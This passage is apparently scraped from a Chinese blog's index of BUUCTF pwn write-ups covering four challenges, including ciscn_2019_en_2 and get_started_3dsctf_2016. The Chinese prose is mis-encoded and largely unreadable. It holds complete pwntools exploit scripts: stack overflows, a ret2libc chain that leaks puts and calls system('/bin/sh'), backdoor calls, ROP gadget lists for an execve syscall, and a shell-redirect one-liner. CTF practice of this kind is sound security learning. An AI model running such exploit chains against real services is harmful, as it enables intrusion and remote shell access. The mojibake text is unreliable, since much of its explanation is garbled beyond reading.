strlen(s) ) break; if ( s[x] \u0026lt;= 96 || s[x] \u0026gt; 122 ) { if ( s[x] \u0026lt;= 64 || s[x] \u0026gt; 90 ) { if ( s[x] \u0026gt; 47 \u0026amp;\u0026amp; s[x] \u0026lt;= 57 ) s[x] ^= 0xCu; } else { s[x] ^= 0xDu; } } else { s[x] ^= 0xEu; } ++x; } puts(\u0026#34;Ciphertext\u0026#34;); return puts(s); } è¿™ä»£ç ä¹Ÿæ˜¯ä¹±å¾—ä¸å¾—äº†ï¼Œå’Œç¥ç»ç—…å‘ç™«ä¸€æ ·ã€‚ä½†æ˜¯å…¶å®é‚£ä¸€å¤§ä¸²whileé‡Œé¢çš„ä»£ç éƒ½å¯ä»¥é€šè¿‡è¿™ä¸€å¥æ¥è·³è¿‡å»ï¼š\nv0 = (unsigned int)x; // v0 \u0026gt;= 0 if ( v0 \u0026gt;= strlen(s) ) break; å¦‚æœæˆ‘ä»¬è®©sçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º\\0çš„è¯ï¼Œé‚£ä¹ˆå®ƒstrlenåçš„å€¼å°±å§‹ç»ˆä¸º 0ï¼Œv0å§‹ç»ˆå¤§äºç­‰äºsçš„é•¿åº¦ï¼Œé‚£ä¹ˆå°±èƒ½ç›´æ¥è·³å‡ºå¾ªç¯ï¼Œä¸ç”¨è¿›è¡Œä¸‹é¢é‚£ä¸€å¤§ä¸²æ“ä½œã€‚\næˆ‘ä»¬åˆçœ‹åˆ°è¾“å…¥å‡½æ•°ä¸ºgetsï¼Œè¿™è¯´æ˜å¯ä»¥æ ˆæº¢å‡ºï¼ŒåŒæ—¶ç¨‹åºåˆæœ‰putså‡½æ•°ï¼Œæˆ‘ä»¬å°±èƒ½å¾—åˆ°libcçš„åŸºå€ï¼Œä»è€Œè®¡ç®—å‡ºsystemçš„çœŸå®åœ°å€\næ„å»º exp å…ˆæŠŠretå’Œpop rdi;retè¿™ä¸¤ä¸ª gadget å‡†å¤‡å¥½ï¼š\n$ ROPgadget --binary ciscn_2019_en_2 --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ ... 0x0000000000400c83 : pop rdi ; ret ... 0x00000000004006b9 : ret ... ä¹Ÿå¯ä»¥é€šè¿‡ pwntools çš„å†…ç½®å‡½æ•°å¾—åˆ°ï¼š\nrop_gadget = ROP(m_elf) pop_rdi: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] puts çš„ plt å’Œ got åœ°å€ã€main çš„åœ°å€åŒç†ï¼š\nputs_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] main_addr: int = m_elf.sym[\u0026#34;main\u0026#34;] ç„¶åæˆ‘ä»¬å¯ä»¥æ„å»ºç¬¬ä¸€ä¸ª payload äº†ï¼š\n# offset:int = 0x58ï¼Œå¯ä»¥ç”±gdbæˆ–è€…idaå¾—çŸ¥ payload = b\u0026#34;\\0\u0026#34;*offset + pg(pop_rdi) + pg(puts_got) + pg(puts_plt) + pg(main_addr) ç„¶åæˆ‘ä»¬å°±èƒ½å¾—åˆ°putsçš„çœŸå®åœ°å€äº†ï¼š\np.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) # è¿™é‡Œå¾ˆå¥‡æ€ªï¼Œè°ƒè¯•åå‘ç°å¤šäº†ä¸€ä¸ª0aï¼Œè¦æŠŠå®ƒåæ‰ p.recv(1) # å¾—åˆ°çœŸå®åœ°å€ puts_addr:int = u64(p.recv(6)+b\u0026#34;\\x00\\x00\u0026#34;) ä¸ºäº†é¿å…å„ç§ç‰ˆæœ¬çš„ libc å½±å“ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ LibcSearcherï¼š\n# è®¡ç®—å¾—åˆ°åŸºå€å’Œsystemåœ°å€ searcher = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) # æ‰‹åŠ¨é€‰æ‹©ç¬¬0å·æœç´¢åˆ°çš„libc # å¦‚æœä½ é€‰æ‹©0å·ä¸è¡Œï¼Œä¹Ÿå¯ä»¥æŠŠè¿™è¡Œæ³¨é‡Šæ‰ï¼Œè¿è¡Œä¸­å†é€‰æ‹© searcher.select_libc(0) base_addr:int = puts_addr - searcher.dump(\u0026#34;puts\u0026#34;) system_addr:int = base_addr + searcher.dump(\u0026#34;system\u0026#34;) bin_sh_addr: int = base_addr + searcher.dump(\u0026#34;str_bin_sh\u0026#34;) åŸç‰ˆ LibcSearcher å·²ç»å¹´ä¹…å¤±ä¿®ï¼Œè€Œä¸”åŸºäºæœ¬åœ° libc åº“ï¼Œå‡ ä¹å®Œå…¨ä¸å¯ç”¨ï¼ŒGitHub ä¸Šæœ‰å¾ˆå¤šæ–°ç‰ˆ LibcSearcherï¼Œæˆ‘é€‰æ‹©äº†è¿™ä¸ªä½¿ç”¨äº‘ç«¯ libc åº“çš„é¡¹ç›®\nä½œè€…ä¸ºäº†ä½¿ç”¨æ­£ç¡®çš„ libc ç”šè‡³é‡æ–°æ­äº†ä¸€ä¸ª ubuntu18.04 çš„è™šæ‹Ÿæœºç¯å¢ƒï¼Œä½†æ˜¯åœ¨å‡ ä¸ªå°æ—¶çš„å¿™ç¢Œåå‘ç° libc ç‰ˆæœ¬è¿˜æ˜¯ä¸å¯¹ï¼Œäºæ˜¯è½¬è€Œé€‰æ‹© LibcSearcherï¼Œä¸å¾—ä¸è¯´ï¼Œæ˜¯çœŸ**çš„å¥½ç”¨ï¼Œæ„Ÿè°¢åŸä½œè€…å’Œåç»­æ— ç§å¥‰çŒ®çš„å¼€å‘è€…ï¼\nç„¶åæˆ‘ä»¬å¯ä»¥æ„å»º payload äº†ï¼š\npayload = b\u0026#34;\\0\u0026#34;*offset + pg(ret) + pg(pop_rdi) + pg(bin_sh_addr) + pg(system_addr) å®Œæ•´ exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_2019_en_2\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;29058\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;}) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) # æŸ¥æ‰¾gadgetçš„å†…ç½®å‡½æ•° if not if_32: rop_gadget = ROP(m_elf) pop_rdi: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] success(f\u0026#34;pop_rdi:{hex(pop_rdi)}\u0026#34;) success(f\u0026#34;ret:{hex(ret)}\u0026#34;) else: pop_rdi:int = 0 ret:int = 0 #éœ€è¦è‡ªè¡Œè®¾å®šoffset offset:int = 0x58 # éœ€è¦æ”¹ä¸ºéœ€è¦çš„è¾“å…¥å‡½æ•°ï¼Œé»˜è®¤ä¸ºputs puts_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] main_addr: int = m_elf.sym[\u0026#34;main\u0026#34;] success(f\u0026#34;puts_plt:{hex(puts_plt)}\u0026#34;) success(f\u0026#34;puts_got:{hex(puts_got)}\u0026#34;) success(f\u0026#34;main_addr:{hex(main_addr)}\u0026#34;) # å‘é€payload p.recvuntil(b\u0026#34;Input your choice!\\n\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) if if_32: payload = b\u0026#34;a\u0026#34;*offset + pg(puts_plt) + pg(main_addr) + pg(0) + pg(puts_got) p.sendline(payload) # å¾—åˆ°çœŸå®åœ°å€ puts_addr:int = u32(p.recv(4)) else: payload = b\u0026#34;\\0\u0026#34;*offset + pg(pop_rdi) + pg(puts_got) + pg(puts_plt) + pg(main_addr) p.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) p.recv(1) # å¾—åˆ°çœŸå®åœ°å€ puts_addr:int = u64(p.recv(6)+b\u0026#34;\\x00\\x00\u0026#34;) # è®¡ç®—å¾—åˆ°åŸºå€å’Œsystemåœ°å€ searcher = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) searcher.select_libc(0) base_addr:int = puts_addr - searcher.dump(\u0026#34;puts\u0026#34;) system_addr:int = base_addr + searcher.dump(\u0026#34;system\u0026#34;) bin_sh_addr: int = base_addr + searcher.dump(\u0026#34;str_bin_sh\u0026#34;) success(f\u0026#34;puts_addr:{hex(puts_addr)}\u0026#34;) success(f\u0026#34;base_addr:{hex(base_addr)}\u0026#34;) success(f\u0026#34;system_addr:{hex(system_addr)}\u0026#34;) success(f\u0026#34;bin_sh_addr:{hex(bin_sh_addr)}\u0026#34;) # å‘é€payload p.recvuntil(b\u0026#34;Input your choice!\\n\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) if if_32: payload = b\u0026#34;a\u0026#34;*offset + pg(system_addr) + pg(0) + pg(bin_sh_addr) p.sendline(payload) else: payload = b\u0026#34;\\0\u0026#34;*offset + pg(ret) + pg(pop_rdi) + pg(bin_sh_addr) + pg(system_addr) p.sendline(payload) p.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/libsearcherciscn_2019_en_2/","section":"writeup","summary":"Do you want to know who you are? Don\u0026rsquo;t ask. Act! Action will delineate and define you. â€” Thomas Jefferson åŸé¢˜é“¾æ¥å’Œè¿™é“é¢˜æ˜¯ä¸€é“é¢˜ï¼Œä¸€æ¨¡ä¸€æ ·çš„ ã€Write-upã€‘BUUCTF ciscn_2019_en_2 checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»º exp å®Œæ•´","tags":["pwn","LibSearcher"],"title":"ã€LibSearcherã€‘ciscn_2019_en_2"},{"categories":["writeup"],"contents":" People ask me what I do in winter when there\u0026rsquo;s no baseball. I\u0026rsquo;ll tell you what I do. I stare out the window and wait for spring. â€” Rogers Hornsby\nåŸé¢˜é“¾æ¥\n\u0026quot;ã€Write-upã€‘BUUCTF not_the_same_3dsctf_2016 checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file not_the_same_3dsctf_2016 [*] \u0026#39;/home/peterl/security/workspace/not_the_same_3dsctf_2016/not_the_same_3dsctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 32ä½ç¨‹åºå¸¦å †é˜²æŠ¤\nåŒæ—¶ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨ lddå‘½ä»¤ï¼Œå°±ä¼šå‘ç°è¿™ä¸ªç¨‹åºæ˜¯ä¸€ä¸ªé™æ€é“¾æ¥ç¨‹åº\nidaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æˆ‘ä»¬å‘ç°ä¸»å‡½æ•°å¾ˆç®€å•å°±èƒ½æ ˆæº¢å‡ºï¼Œé‚£æˆ‘ä»¬å†æ‰¾æ‰¾æœ‰æ²¡æœ‰åé—¨å‡½æ•°\nç»“æœå‘ç°äº†get_secretå‡½æ•°ï¼š\næˆ‘ä»¬å‘ç°è¿™ä¸ªåé—¨å‡½æ•°å®åœ¨æœ‰ç‚¹ç‰¹æ®Šï¼Œä¸»è¦é€»è¾‘æ˜¯æ‰“å¼€ç›®å½•ä¸‹çš„flag.txtæ–‡ä»¶ï¼Œç„¶åè¯»å…¥å¼€å¤´çš„è‡³å¤š45ä¸ªå­—ç¬¦å…¥fl4gå˜é‡ï¼Œæˆ‘ä»¬åŒå‡»fl4gå˜é‡å‘ç°å…¶åœ°å€ä¸ºï¼š\næ„å»ºexp æˆ‘ä»¬ä½¿ç”¨readelf -så‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹ç¨‹åºçš„ç¬¦å·è¡¨ï¼š\n$ readelf -s not_the_same_3dsctf_2016 | grep fl4g 1506: 080eca2d 45 OBJECT GLOBAL DEFAULT 24 fl4g $ readelf -s not_the_same_3dsctf_2016 | grep printf ... 901: 0804f0a0 30 FUNC GLOBAL DEFAULT 5 printf ... é‚£ä¹ˆæˆ‘ä»¬çš„åŸºæœ¬æ€è·¯å°±æ˜¯ï¼Œå…ˆæ ˆæº¢å‡ºè°ƒç”¨åé—¨å‡½æ•°ï¼Œç„¶åè°ƒç”¨è¾“å‡ºå‡½æ•°printfè¾“å‡ºfl4g\npayload = b\u0026#34;a\u0026#34;*0x2D + pg(backdoor) + pg(m_elf.sym[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;exit\u0026#39;]) + pg(m_elf.symbols[\u0026#39;fl4g\u0026#39;]) æ³¨æ„ï¼Œè¿™é‡Œä¸€å®šè¦ä½¿ç”¨exité€€å‡ºï¼Œè¿™é‡Œçš„exitèµ·äº†ä¸€ä¸ªreturnè¯­å¥çš„ä½œç”¨\nå®Œæ•´exp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./not_the_same_3dsctf_2016\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;28534\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x8048A00\u0026#34;) else: p = process(fn) m_elf = ELF(fn) backdoor = 0x80489a0 p.clean() # è¿™é‡Œä¸èƒ½ç›´æ¥recvuntilï¼Œå› ä¸ºprintfä¸åˆ·æ–°ç¼“å†²åŒºï¼Œpwntoolsè¿™ç§ç”¨ç®¡é“çš„å·¥å…·æ— æ³•æ¥æ”¶åˆ°ä»»ä½•å­—ç¬¦ # p.recvuntil(\u0026#34;b0r4 v3r s3 7u 4h o b1ch4o m3m0... \u0026#34;) payload = b\u0026#34;a\u0026#34;*0x2D + pg(backdoor) + pg(m_elf.sym[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;exit\u0026#39;]) + pg(m_elf.symbols[\u0026#39;fl4g\u0026#39;]) p.sendline(payload) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/printf%E4%B8%8D%E5%88%B7%E6%96%B0%E7%BC%93%E5%86%B2%E5%8C%BAnot_the_same_3dsctf_2016/","section":"writeup","summary":"People ask me what I do in winter when there\u0026rsquo;s no baseball. I\u0026rsquo;ll tell you what I do. I stare out the window and wait for spring. â€” Rogers Hornsby åŸé¢˜é“¾æ¥ \u0026quot;ã€Write-upã€‘BUUCTF not_the_same_3dsctf_2016 checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥","tags":["pwn","printfä¸åˆ·æ–°ç¼“å†²åŒº","æ— å›æ˜¾"],"title":"ã€printfä¸åˆ·æ–°ç¼“å†²åŒºã€‘not_the_same_3dsctf_2016"},{"categories":["writeup"],"contents":" The most formidable weapon against errors of every kind is reason. â€” Thomas Paine\nåŸé¢˜é“¾æ¥\nç›´æ¥ç»™äº†shellï¼Œä½†æ˜¯æŠŠè¾“å‡ºæµå…³äº† è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ç”¨shellé‡å®šå‘è¾“å‡ºæµåˆ°è¾“å…¥æµï¼š\nexec 1\u0026gt;\u0026amp;0 cat flag ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/shell%E9%87%8D%E5%AE%9A%E5%90%91buuctf-wustctf2020_closed/","section":"writeup","summary":"The most formidable weapon against errors of every kind is reason. â€” Thomas Paine åŸé¢˜é“¾æ¥ ç›´æ¥ç»™äº†shellï¼Œä½†æ˜¯æŠŠè¾“å‡ºæµå…³äº† è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ç”¨shellé‡å®šå‘è¾“å‡ºæµåˆ°è¾“å…¥æµï¼š exec 1\u0026gt;\u0026amp;0 cat flag","tags":["pwn","shellé‡å®šå‘"],"title":"ã€shellé‡å®šå‘ã€‘BUUCTF wustctf2020_closed"},{"categories":["writeup"],"contents":" We are shaped by our thoughts; we become what we think. When the mind is pure, joy follows like a shadow that never leaves. â€” Buddha\nåŸé¢˜é“¾æ¥\nåœ¨åšé¢˜å‰ï¼Œæˆ‘å…ˆä¸ºå…¶å»ºç«‹äº†ä¸€ä¸ªä¸“é—¨çš„å·¥ä½œç›®å½•ï¼š ã€syscallã€‘ã€Write-upã€‘BUUCTF Get_started_3dsctf_2016 checksec æŸ¥çœ‹æ¶æ„ ida æŸ¥çœ‹ç¨‹åºï¼ˆä¼ªï¼‰ä»£ç  main å‡½æ•° åé—¨å‡½æ•° æ„å»º exp é€šè¿‡åé—¨å‡½æ•°æ„å»º exp å®Œæ•´ exp1 é€šè¿‡ syscall æ„å»º exp æ²¡æœ‰ç°æˆ\u0026quot;/bin/sh\u0026quot;ï¼šæ„å»ºå­—ç¬¦ä¸² å®Œæ•´ exp2 ä¸€äº›æ‚¬è€Œæœªå†³çš„å°é—®é¢˜ ä½œè€…è¯•å›¾ä¸ä½¿ç”¨pop edx;pop ecx;pop ebx;retåªä½¿ç”¨pop edx;ret æ— æ³•æ‰§è¡Œå…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶ checksec æŸ¥çœ‹æ¶æ„ çœ‹æ¥æ˜¯ 32 ä½çš„ç¨‹åºã€‚æˆ‘ä»¬é¦–å…ˆå°±è¦æƒ³åˆ°ï¼Œ32 ä½ç¨‹åºçš„å‚æ•°ä¼ é€’æ–¹å¼å’Œ 64 ä½ç¨‹åºçš„æ˜¯ä¸ä¸€æ ·çš„ï¼š\n32 ä½å°†å‚æ•°ä»å³åˆ°å·¦å…ˆåå‹å…¥æ ˆä¸­ 64 ä½ç¨‹åºå°†å‚æ•°åˆ†åˆ«ç”¨ RDI,RSI,RCX,RDX,R8,R9 ä½œä¸ºç¬¬ 1-6 ä¸ªå‚æ•°ï¼Œç”¨ RAX ä¿å­˜è¿”å›å€¼ æ‰€ä»¥ï¼Œæˆ‘ä»¬è°ƒç”¨ system å‡½æ•°çš„æ€è·¯å°±ä¸ä¸€æ ·äº†ã€‚æˆ‘ä»¬å°±ä¸éœ€è¦ pop rdi;ret è¿™ä¸ª gadgetï¼ˆåœ¨ 32 ä½ç¨‹åºä¸­ä¹Ÿæ‰¾ä¸åˆ°ï¼‰ï¼Œè€Œæ˜¯åªéœ€è¦æ³¨æ„ç”¨ ret è¿™ä¸ª gadget ä¿æŒæ ˆè¿”å›æ—¶æœ€åä¸€ä½ä¸º 0 å³å¯ï¼ˆsystem ç‰¹æ®Šè§„å®šï¼‰ï¼Œå¯ä»¥å‚è€ƒè¿™é‡Œ\nä½†æ˜¯å¦‚æœç¨‹åºå¾ˆå¥½å¿ƒåœ°ä¸ºæˆ‘ä»¬æä¾›äº†åé—¨å‡½æ•°ï¼Œé‚£ä¸Šé¢çš„è¿™äº›ä¹Ÿä¸ç”¨è€ƒè™‘äº†\nåŒæ—¶ï¼Œæˆ‘ä»¬è¦æ³¨æ„ 32 ä½ç¨‹åºç”±äºå‚æ•°ä¿å­˜åœ¨æ ˆä¸­ï¼Œcall çš„åŒæ—¶è¿˜ä¼šå°†ã€ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åç§»ã€‘å‹å…¥æ ˆä¸­ï¼Œå› æ­¤æˆ‘ä»¬è¦ä¸ºã€ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åç§»ã€‘é¢„ç•™å‡ºä½ç½®\nida æŸ¥çœ‹ç¨‹åºï¼ˆä¼ªï¼‰ä»£ç  main å‡½æ•° çœ‹æ¥æ˜¯ç®€å•çš„æ ˆæº¢å‡º\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ï¼Œå³ printf å’Œ puts çš„åŒºåˆ«ã€‚\nprintf åœ¨è°ƒç”¨å®Œåå¹¶ä¸ä¼šé©¬ä¸Šæ‰“å°å‡ºå­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ç­‰å¾…åˆ·æ–°ç¼“å†²åŒºçš„æŒ‡ä»¤ä¹‹åæ‰æ˜¾ç¤ºå­—ç¬¦ä¸²ã€‚åœ¨è¿™é‡Œå°±ä½“ç°ä¸ºï¼Œåˆ° gets å‡½æ•°å‘ç”¨æˆ·è¯·æ±‚è¾“å…¥æ—¶ï¼Œè¿˜æ²¡æœ‰ä»»ä½•å­—ç¬¦ä¸²æ˜¾ç¤ºã€‚\nå› æ­¤ï¼Œå¯èƒ½æœ‰äººä¼šåœ¨å†™ exp çš„æ—¶å€™ï¼Œä¸€ç›´ç­‰å¾…å­—ç¬¦ä¸²è¾“å‡ºï¼Œçœ‹ä¸€ç›´æ²¡ååº”è¿˜ä»¥ä¸ºè‡ªå·± payload å†™é”™äº†ï¼ˆ\nå…·ä½“çš„ printf å’Œ puts çš„åŒºåˆ«å¯ä»¥çœ‹è¿™ä½å¤§ä½¬çš„åšæ–‡ï¼Œéå¸¸è¯¦ç»†\nåé—¨å‡½æ•° ç„¶åæˆ‘ä»¬å°±å‘ç°äº†ç¨‹åºå¥½å¿ƒä¸ºæˆ‘ä»¬æä¾›çš„åé—¨å‡½æ•°ï¼ˆ\nåªè¦æˆ‘ä»¬ä¼ å…¥å‚æ•°åˆ†åˆ«ä¸º 814536271 å’Œ 425138641ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¾—åˆ° flag çš„å†…å®¹\næ„å»º exp é€šè¿‡åé—¨å‡½æ•°æ„å»º exp æ­¥éª¤å¦‚ä¸‹ï¼š\né¦–å…ˆæˆ‘ä»¬è¦æ‰¾åˆ° offset æº¢å‡ºåˆ° return çš„æ ˆåœ°å€ï¼Œè¿™é€šè¿‡ ida å¾ˆå®¹æ˜“å‘ç°\rç„¶åæˆ‘ä»¬å°±å°†åé—¨å‡½æ•°åœ°å€å’Œå‚æ•°å€¼å¡«å…¥æ ˆä¸­å³å¯ # pg = p32 payload = b\u0026#34;a\u0026#34;*0x38 + pg(0x80489a0) + pg(0) + pg(814536271) + pg(425138641) ç„¶åç›´æ¥ sendline å°± ğŸ†— å•¦\nå®Œæ•´ exp1 from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./get_started_3dsctf_2016\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25191\u0026#34; if_32: bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: p = process(fn) payload = b\u0026#34;a\u0026#34;*0x38 + pg(0x80489a0) + pg(0) + pg(814536271) + pg(425138641) p.sendline(payload) p.interactive() é€šè¿‡ syscall æ„å»º exp æˆ‘ä»¬é€šè¿‡ ida å¯ä»¥å¾—çŸ¥ï¼Œè¯¥ç¨‹åº plt è¡¨å†…æ²¡æœ‰ system å‡½æ•°ä¹Ÿæ²¡æœ‰ execve å‡½æ•°ï¼ŒåŒæ—¶æ­¤é¢˜åˆæ˜¯é™æ€ç¼–è¯‘ï¼Œå°±ä¸èƒ½é€‚ç”¨ ret2libc çš„æ–¹æ³•ä» libc ä¸­æ‰¾åˆ° systemã€‚\nä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºä¸­æ–­æ—¶äº§ç”Ÿçš„ç³»ç»Ÿè°ƒç”¨æ¥æ‰§è¡Œ execve è¿™ä¸ªä¸­æ–­ç¨‹åº\nå…¨éƒ¨ä¸­æ–­ç¨‹åºç¼–å·è§æ­¤\nè¿™é‡Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ° 59 å·ä¸­æ–­ç¨‹åºï¼Œå‘å®ƒä¼ å‚å³å¯\n64 ä½ç¼–å·æ˜¯ 59ï¼Œä¹Ÿå°±æ˜¯ 0x3b\n32 ä½ç¼–å·æ˜¯ 11ï¼Œä¹Ÿå°±æ˜¯ 0xbã€‚\nåŒæ—¶ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç¨‹åºæ˜¯ 32 ä½çš„ï¼Œæˆ‘ä»¬éœ€è¦å°†ç¼–å·ä¼ ç»™ eax å¯„å­˜å™¨ï¼Œå‰©ä½™å‚æ•°åˆ†åˆ«ä¼ å…¥ ecx,edx,esi,edi,ebp ä¸­\nç„¶åï¼Œæˆ‘ä»¬è¦æ‰¾åˆ°è¿™å‡ ä¸ªå‚æ•°å¯¹åº”çš„å€¼ã€‚execve å‡½æ•°åä¸¤ä¸ªå‚æ•°å¯ä»¥ä¸ç®¡è®¾ä¸º 0ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°åº”è¯¥æ˜¯/bin/shæˆ–è€…sh\nä¸ºäº†å°†è¿™å‡ ä¸ªå‚æ•°é€å…¥å¯„å­˜å™¨ä¸­ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ª gadgetï¼Œä¸ä»…å¯ä»¥å®Œæˆä»»åŠ¡ï¼Œè¿˜å¯ä»¥é€šè¿‡retæŒ‡ä»¤æ¥ç€è¯»ä¸‹ä¸€æ¡æŒ‡ä»¤\næˆ‘ä»¬ç”¨ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;pop|ret\u0026quot; | grep eaxæ‰¾ gadgetï¼š\næ¯”è¾ƒé—æ†¾çš„æ˜¯ï¼Œæ²¡æœ‰åˆšåˆšå¥½çš„ gadgetï¼Œä½†æ˜¯æœ‰ä¸€æ¡å‹‰å¼ºå¯ç”¨ï¼š\n0x080b91e6 : pop eax ; ret é‚£æˆ‘ä»¬ç»§ç»­æ‰¾ ebxã€ecxã€edxï¼š\n$ROPgadget --binary get_started_3dsctf_2016 --only \u0026#34;pop|ret\u0026#34; | grep ebx 0x0809e102 : pop ds ; pop ebx ; pop esi ; pop edi ; ret 0x0809e0fa : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0805bf3d : pop ebp ; pop ebx ; pop esi ; pop edi ; ret 0x0809e4c4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret 0x0809a7dc : pop ebx ; pop edi ; ret 0x0806fc09 : pop ebx ; pop edx ; ret 0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret 0x080483b7 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x080a25b6 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10 0x08096b1e : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14 0x080718b1 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc 0x0804ab66 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4 0x08049a95 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8 0x080509a5 : pop ebx ; pop esi ; pop edi ; ret 0x080498af : pop ebx ; pop esi ; pop edi ; ret 4 0x08049923 : pop ebx ; pop esi ; ret 0x080481ad : pop ebx ; ret 0x080d413c : pop ebx ; ret 0x6f9 0x08099f96 : pop ebx ; ret 8 0x0806fc31 : pop ecx ; pop ebx ; ret 0x08063adb : pop edi ; pop esi ; pop ebx ; ret 0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret 0x0809e0f9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0807b1b0 : pop es ; pop ebx ; ret 0x0806fc08 : pop esi ; pop ebx ; pop edx ; ret 0x0805d090 : pop esi ; pop ebx ; ret 0x0805b8a0 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0809efe2 : pop ss ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret å…¶ä¸­ï¼Œæœ‰ä¸€æ¡ä¸€ä¸‹å­å°±èƒ½åŒæ—¶è®¾ç½®ä¸‰ä¸ªéœ€è¦ç”¨çš„å¯„å­˜å™¨ï¼š\n0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret é‚£ç°åœ¨æˆ‘ä»¬çš„æ ˆä»ä½åˆ°é«˜å°±åº”è¯¥æ˜¯ eax-\u0026gt;edx-\u0026gt;ecx-\u0026gt;ebx ç„¶åæˆ‘ä»¬éœ€è¦æ‰¾åˆ°int 0x80è¿™ä¸ª 32 ä½ç³»ç»Ÿè°ƒç”¨ system call çš„ä¸­æ–­æŒ‡ä»¤ï¼ˆ64 ä½å°±æ˜¯ syscallï¼‰ï¼š0x0806d7e5 